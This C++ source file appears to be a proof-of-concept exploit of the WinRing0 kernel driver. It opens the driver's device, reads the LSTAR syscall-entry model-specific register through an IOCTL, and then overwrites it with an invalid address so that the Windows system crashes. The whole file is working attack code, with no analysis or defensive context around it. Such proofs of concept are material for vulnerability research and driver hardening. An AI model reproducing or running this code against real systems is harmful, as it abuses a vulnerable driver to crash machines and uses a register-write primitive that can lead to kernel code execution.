#include <fmt/format.h>
#include <iostream>
#include <windows.h>

#define OLS_TYPE 40000
#define IOCTL_OLS_GET_DRIVER_VERSION \
    CTL_CODE(OLS_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OLS_READ_MSR \
    CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OLS_WRITE_MSR \
    CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DRIVER_PIPE  "\\\\.\\WinRing0_1_2_0"
#define MSR_LSTAR    0xC0000082

typedef struct _OLS_WRITE_MSR_INPUT {
	ULONG Register;
	ULARGE_INTEGER Value;
} OLS_WRITE_MSR_INPUT;

bool GetDriverHandle(HANDLE& driverHandle) {
	driverHandle = CreateFileA(DRIVER_PIPE, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		fmt::print("Failed to open driver handle. Error: {}\n", GetLastError());
		return false;
	}
	fmt::print("Driver handle opened successfully.\n");

	return true;
}

bool SendIORequest(HANDLE driverHandle, DWORD ioctlCode, LPVOID inBuffer, DWORD inBufferSize, LPVOID outBuffer, DWORD outBufferSize, LPDWORD bytesReturned) {
	if (!DeviceIoControl(driverHandle, ioctlCode, inBuffer, inBufferSize, outBuffer, outBufferSize, bytesReturned, nullptr)) {
		fmt::print("DeviceIoControl failed. Error: {}\n", GetLastError());
		return false;
	}
	fmt::print("IOCTL sent successfully.\n");
	return true;
}

int main() {
	HANDLE driverHandle;

	fmt::print("Obtaining driver handle...\n");
	if (!GetDriverHandle(driverHandle)) {
		fmt::print("Could not get driver handle. Is it started?\n");
		return 1;
	}
	fmt::print("Driver handle obtained.\n");

	ULARGE_INTEGER msrValue      = { 0 };
	ULONG          msrRegister   = MSR_LSTAR;
	DWORD          bytesReturned;

	fmt::print("Reading MSR_LSTAR (0x{:X})...\n", MSR_LSTAR);
	if (!SendIORequest(driverHandle, IOCTL_OLS_READ_MSR, &msrRegister, sizeof(msrRegister), &msrValue, sizeof(msrValue), &bytesReturned)) {
		fmt::print("Failed to read MSR_LSTAR.\n");
		CloseHandle(driverHandle);
		return 1;
	}
	fmt::print("MSR_LSTAR Value: 0x{:X}\n", msrValue.QuadPart);

	OLS_WRITE_MSR_INPUT writeMsrInput;
	writeMsrInput.Register       = MSR_LSTAR;
	writeMsrInput.Value.QuadPart = INT64_MAX;

	fmt::print("Writing new value to MSR_LSTAR at 0x{:X} with invalid address...\n", MSR_LSTAR);
	if (!SendIORequest(driverHandle, IOCTL_OLS_WRITE_MSR, &writeMsrInput, sizeof(writeMsrInput), nullptr, 0, &bytesReturned)) {
		fmt::print("Failed to write MSR_LSTAR.\n");
		CloseHandle(driverHandle);
		return 1;
	}
	fmt::print("MSR_LSTAR updated successfully. System will crash.\n");

	CloseHandle(driverHandle);
	return 0;
}
